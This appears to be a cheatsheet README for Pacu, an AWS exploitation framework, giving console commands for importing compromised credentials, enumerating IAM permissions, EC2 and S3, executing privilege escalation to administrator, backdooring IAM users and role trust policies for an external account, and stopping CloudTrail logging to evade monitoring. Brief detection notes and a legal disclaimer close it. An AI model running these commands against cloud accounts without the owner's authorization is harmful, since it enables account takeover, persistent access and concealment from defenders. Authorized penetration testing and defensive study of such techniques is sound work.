# ☁️ Pacu - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```

<p align="center">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Cloud Security">
</p>

<p align="center">
  <b>☁️ The open-source AWS exploitation framework designed for penetration testing cloud environments, privilege escalation, credential harvesting, and infrastructure reconnaissance</b>
</p>

---

## 📋 Table of Contents

- [Overview & Architecture](#-overview--architecture)
- [Installation](#-installation)
- [Session Management & AWS Key Import](#-session-management--aws-key-import)
  - [Importing Compromised Credentials](#importing-compromised-credentials)
  - [Assumed Roles and Session Tokens](#assumed-roles-and-session-tokens)
- [Reconnaissance & Enumeration Modules](#-reconnaissance--enumeration-modules)
  - [Enumerating Current IAM Permissions](#enumerating-current-iam-permissions)
  - [Scanning EC2 Instances & S3 Buckets](#scanning-ec2-instances--s3-buckets)
- [Privilege Escalation Techniques in AWS](#-privilege-escalation-techniques-in-aws)
  - [Automatic Privilege Escalation Scanner](#automatic-privilege-escalation-scanner)
  - [Executing Escalation Modules](#executing-escalation-modules)
- [Persistence & Defense Evasion](#-persistence--defense-evasion)
  - [Backdooring IAM Roles & Users](#backdooring-iam-roles--users)
  - [Disrupting CloudTrail Logging](#disrupting-cloudtrail-logging)
- [Quick Reference Table](#-quick-reference-table)
- [Defensive Considerations & Detection](#-defensive-considerations--detection)
- [Legal Disclaimer](#-legal-disclaimer)

---

## 🎯 Overview & Architecture

Created by **Rhino Security Labs**, **Pacu** is the "Metasploit for AWS". It is designed to emulate adversarial tactics within Amazon Web Services environments.

Pacu operates using a local SQLite database that maintains state across offensive sessions:
- **Modular Pipeline:** Over 40 specialized modules covering discovery, lateral movement, privilege escalation, persistence, and exfiltration.
- **Permission Enumeration:** Analyzes IAM policies without triggering alert thresholds by testing API actions or reviewing attached managed policies.
- **Privesc Automation:** Evaluates known IAM permission escalation paths (such as `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥 Installation

```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```

---

## 🔑 Session Management & AWS Key Import

When Pacu launches, you enter an interactive console. Create or select a session:

```text
Pacu > set_session client_assessment
```

### Importing Compromised Credentials
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```

### Assumed Roles and Session Tokens
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```

---

## 🔍 Reconnaissance & Enumeration Modules

### Enumerating Current IAM Permissions
Determine who you are and what the active credentials are permitted to do:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```

### Scanning EC2 Instances & S3 Buckets
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```

---

## ⚡ Privilege Escalation Techniques in AWS

AWS privilege escalation relies on misconfigured IAM policies that permit non-administrative users to grant themselves or other entities administrative rights.

### Automatic Privilege Escalation Scanner
Scans your enumerated permissions against 21+ documented AWS privesc vectors:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*Sample output highlights vulnerable permissions like `iam:PutUserPolicy`, `iam:AttachUserPolicy`, or `iam:CreateAccessKey`.*

### Executing Escalation Modules
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```

---

## 🛡️ Persistence & Defense Evasion

### Backdooring IAM Roles & Users
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```

### Disrupting CloudTrail Logging
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```

---

## ⚡ Quick Reference Table

| Objective | Pacu Command |
|-----------|--------------|
| **Set/Select Session** | `set_session <NAME>` |
| **Import AWS Credentials** | `set_keys` |
| **Show Current Identity** | `whoami` |
| **Enumerate IAM Rights** | `run iam__enum_permissions` |
| **Scan for Privesc Vectors** | `run iam__privesc_scan` |
| **Enumerate S3 Buckets** | `run s3__enum` |
| **Enumerate EC2 Instances** | `run ec2__enum` |
| **Disrupt CloudTrail** | `run cloudtrail__disrupt_logging` |
| **List Available Modules** | `list` |

---

## 🛡️ Defensive Considerations & Detection

1. **GuardDuty & CloudTrail Monitoring:** Pacu's automated privilege escalation and permission scanning generate rapid sequential API queries easily flagged by AWS GuardDuty.
2. **SCP & Permission Boundaries:** Enforce AWS Organizations Service Control Policies (SCPs) preventing any principal—including full Admins—from tampering with CloudTrail or modifying root organization structures.

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> Pacu is designed specifically for authorized AWS penetration tests and security evaluations. Testing cloud accounts without explicit prior permission from the asset owner violates Amazon Web Services Acceptable Use Policy and international law.
